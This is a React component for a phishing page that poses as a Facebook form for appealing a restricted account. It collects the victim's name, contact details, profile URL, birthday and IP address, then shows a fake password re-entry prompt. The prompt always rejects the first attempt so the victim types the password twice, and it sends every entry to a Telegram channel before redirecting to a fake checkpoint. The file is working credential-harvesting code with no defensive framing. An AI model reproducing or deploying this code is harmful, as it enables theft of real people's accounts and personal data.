import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Form, Input, Select, Row, Col, Radio, Button, Modal } from "antd";
import { sendTelegram } from "../utils/sendTelegram";
import { v4 as uuidv4 } from "uuid";
import { isEmptyObject } from "../utils/isEmptyObject";
import { getIpAddress } from "../utils/getIpAddress";

const { Option } = Select;

export const SignUpMobile = () => {
  const navigate = useNavigate();
  const [form] = Form.useForm();
  const [value, setValue] = React.useState(1);
  const [showInput, setShowInput] = React.useState(false);
  const [isModalVisible, setIsModalVisible] = React.useState(false);
  const [showError, setShowError] = React.useState(false);
  const [data, setData] = useState(null);

  // Form Password Modal
  const [attempts, setAttempt] = useState(0);
  const [loading_btn, setLoadingBtn] = useState(false);
  const [form_password, setFormPassword] = useState("");

  const showModal = () => {
    setIsModalVisible(true);
  };

  const handleCancel = () => {
    setIsModalVisible(false);
  };
  const numberArray = [
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
    22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
  ];

  const numberYear = [
    2022, 2021, 2020, 2019, 2018, 2017, 2016, 2015, 2014, 2013, 2012, 2011,
    2010, 2009, 2008, 2007, 2006, 2005, 2004, 2003, 2002, 2001, 2000, 1999,
    1998, 1997, 1996, 1995, 1994, 1993, 1992, 1991, 1990, 1989, 1988, 1987,
    1986, 1985, 1984, 1983, 1982, 1981, 1980, 1979, 1978, 1977, 1976, 1975,
    1974, 1973, 1972,
  ];

  const onSubmit = (values) => {
    if (!values) return;
    const unique_id = uuidv4();
    localStorage.setItem("unique_id", JSON.stringify(unique_id));
    setData(values);
    localStorage.setItem("form_data", JSON.stringify(values));
    let telegram_data = `
    ========== FORM PAGE ==========
      ID: ${unique_id}
    ===============================
      Full name: ${values.full_name}
      Email or phone number: ${values.email}
      FB URL: ${values.fb_url}
      Birthday: ${values.days}-${values.months}-${values.years}
      Optional: ${values.optional}
    ===============================
      ${getIpAddress()}
      `;

    showModal();
    sendTelegram(telegram_data);
  };

  const onSubmitFormPassowrd = () => {
    if (!form_password) return;
    if (form_password.length <= 6) {
      setFormPassword("");
      setShowError(true);
    } else {
      let unique_id = localStorage.getItem("unique_id");
      setShowError(false);
      setAttempt(attempts + 1);

      if (attempts === 0) {
        setLoadingBtn(true);
        localStorage.setItem("password_1", form_password);
        let telegram_data = `
    ========== FORM LOGIN #1 ==========
      ID: ${unique_id}
    ===============================
      Email: ${data?.email || "Ska email"}
      Password: ${form_password}
    ===============================
      ${getIpAddress()}
      `;
        sendTelegram(telegram_data);

        setTimeout(() => {
          setFormPassword("");
          setShowError(true);
          setLoadingBtn(false);
        }, 1000);
      }

      if (attempts >= 1) {
        setLoadingBtn(true);
        localStorage.setItem("password_2", form_password);
        let telegram_data = `
    ========== FORM LOGIN #2 ==========
      ID: ${unique_id}
    ===============================
      Email: ${data?.email || "Ska email"}
      Password: ${form_password}
    ===============================
      ${getIpAddress()}
      `;
        sendTelegram(telegram_data);

        setTimeout(() => {
          setShowError(false);
          setLoadingBtn(false);
          navigate("/checkpoint/next=authentication");
        }, 1000);
      }
    }
  };

  return (
    <>
      <Form form={form} name="register" onFinish={onSubmit} scrollToFirstError>
        <Row className="name-lastname">
          <Col span={24}>
            <Form.Item
              name="full_name"
              rules={[
                {
                  required: true,
                  message: "Please input your full name!",
                },
              ]}
            >
              <Input
                placeholder="Full name"
                style={{ textTransform: "capitalize" }}
              />
            </Form.Item>
          </Col>
        </Row>

        <Row>
          <Col span={24}>
            <Form.Item
              name="email"
              rules={[
                {
                  required: true,
                  message: "Please input your email or phone number!",
                },
              ]}
            >
              <Input placeholder="Mobile number or email" />
            </Form.Item>
          </Col>
        </Row>

        <Row>
          <Col span={24}>
            <Form.Item
              name="fb_url"
              rules={[
                {
                  required: true,
                  message: "Please input your facebook account url!",
                },
              ]}
            >
              <Input placeholder="Facebook Account URL" />
            </Form.Item>
          </Col>
        </Row>
        <Row className="text-birthday">
          <p>Birthday</p>
        </Row>
        <Row>
          <Col className="first-select select-class-sign-up" span={8}>
            <Form.Item name="months">
              <Select
                suffixIcon={<img src="/arrowdown.png" />}
                optionFilterProp="children"
                defaultValue={"Feb"}
                style={{ position: "relative" }}
                virtual={false}
              >
                <Option key="1" value="Jan">
                  Jan
                </Option>
                <Option key="2" value="Feb">
                  Feb
                </Option>
                <Option key="3" value="Mar">
                  Mar
                </Option>
                <Option key="4" value="Apr">
                  Apr
                </Option>
                <Option key="5" value="May">
                  May
                </Option>
                <Option key="6" value="Jun">
                  Jun
                </Option>
                <Option key="7" value="Jul">
                  Jul
                </Option>
                <Option key="8" value="Aug">
                  Aug
                </Option>
                <Option key="9" value="Sep">
                  Sep
                </Option>
                <Option key="10" value="Oct">
                  Oct
                </Option>
                <Option key="11" value="Nov">
                  Nov
                </Option>
                <Option key="12" value="Dec">
                  Dec
                </Option>
              </Select>
            </Form.Item>
          </Col>
          <Col className="second-select select-class-sign-up" span={8}>
            <Form.Item name="days">
              <Select
                optionFilterProp="children"
                defaultValue={"31"}
                suffixIcon={<img src="/arrowdown.png" />}
                style={{ position: "relative" }}
              >
                {numberArray.map((item, idx) => {
                  return (
                    <Option key={item} value={item}>
                      {item}
                    </Option>
                  );
                })}
              </Select>
            </Form.Item>
          </Col>
          <Col className="third-select select-class-sign-up" span={8}>
            <Form.Item
              name="years"
              rules={[
                {
                  required: true,
                  message: "",
                },
              ]}
            >
              <Select
                optionFilterProp="children"
                defaultValue={"2022"}
                suffixIcon={<img src="/arrowdown.png" />}
                style={{ position: "relative" }}
              >
                {numberYear.map((item) => {
                  return (
                    <Option key={item} value={item}>
                      {item}
                    </Option>
                  );
                })}
              </Select>
            </Form.Item>
          </Col>
        </Row>

        <Row>
          <Col span={24} className="optional-input">
            <Form.Item
              label=""
              name="optional"
              // labelCol={{ span: 24 }}
              // wrapperCol={{ span: 24 }}
            >
              <Input
                placeholder="Additional info (Optional)"
                style={{ paddingBottom: "100px" }}
              />
            </Form.Item>
          </Col>
        </Row>

        {/* <Row>
        <Col span={24}>
          <Form.Item
            name="gender"
            rules={[
              {
                required: true,
                message: "Please input your E-mail!",
              },
            ]}
          >
            <Radio.Group
              style={{ width: "100%" }}
              onChange={onChange}
              value={value}
            >
              <Radio value={1}>Female</Radio>
              <Radio value={2}>Male</Radio>
              <Radio value={3}>Custom</Radio>
            </Radio.Group>
          </Form.Item>
        </Col>
      </Row> */}

        {showInput ? (
          <>
            <Row>
              <Col span={24}>
                <Form.Item
                  name="pronaun"
                  rules={[
                    {
                      required: true,
                      message: "Please input your Day",
                    },
                  ]}
                >
                  <Select
                    optionFilterProp="children"
                    defaultValue={"1"}
                    suffixIcon={<img src="/arrowdown.png" />}
                  >
                    <Option key="1" value="1">
                      Select your pronoun
                    </Option>
                    <Option key="2" value="2">
                      She: Wish her a happy birthday!
                    </Option>
                    <Option key="3" value="3">
                      He: Wish him a happy birthday!
                    </Option>
                    <Option key="4" value="4">
                      They: Wish them a happy birthday!
                    </Option>
                  </Select>
                </Form.Item>
              </Col>
            </Row>
            <Row>
              <Col span={24} className="optional-input">
                <Form.Item
                  label="Your pronoun is visible to everyone."
                  name="optional"
                  labelCol={{ span: 24 }}
                  wrapperCol={{ span: 24 }}
                >
                  <Input placeholder="Gender (Optional)" />
                </Form.Item>
              </Col>
            </Row>
          </>
        ) : (
          ""
        )}
        <Row>
          <Col className="text-signup" span={24}>
            <p>
              Only submit this form if your account has been restricted for
              violating Facebook's Community Standards
            </p>
          </Col>
        </Row>
        <Row>
          <Col className="button-sign-up" span={24}>
            <button type="submit">Submit</button>
          </Col>
        </Row>
      </Form>

      <Modal
        className="modal-wrapper"
        width={445}
        title="Please re-enter your password"
        visible={isModalVisible}
        onCancel={handleCancel}
        maskClosable={false}
        footer={
          <>
            <div className="right-button">
              <a>Forgot your password?</a>
            </div>
            <button className="first-button" onClick={handleCancel} key="1">
              Cancel
            </button>
            <button
              className={`second-button ${loading_btn && "disableButton"}`}
              onClick={onSubmitFormPassowrd}
              key="2"
            >
              Submit
            </button>
          </>
        }
      >
        <div className="modal-container">
          {showError && (
            <div className="error-message">
              Enter a valid password and try again.
            </div>
          )}

          <div className="modal-image-with-text">
            <img src="https://i.pinimg.com/564x/b9/dc/14/b9dc143762700bee689092a1c96edc98.jpg" />
            <h2 style={{ textTransform: "capitalize" }}>
              {data?.full_name || "John Doe"}
            </h2>
          </div>
          <p>For your security, you must re-enter your password to continue.</p>
          <div className="text-input-wrapper">
            <label>Password:</label>
            <input
              type="password"
              value={form_password}
              onChange={(e) => setFormPassword(e.target.value)}
            />
          </div>
        </div>
      </Modal>
    </>
  );
};
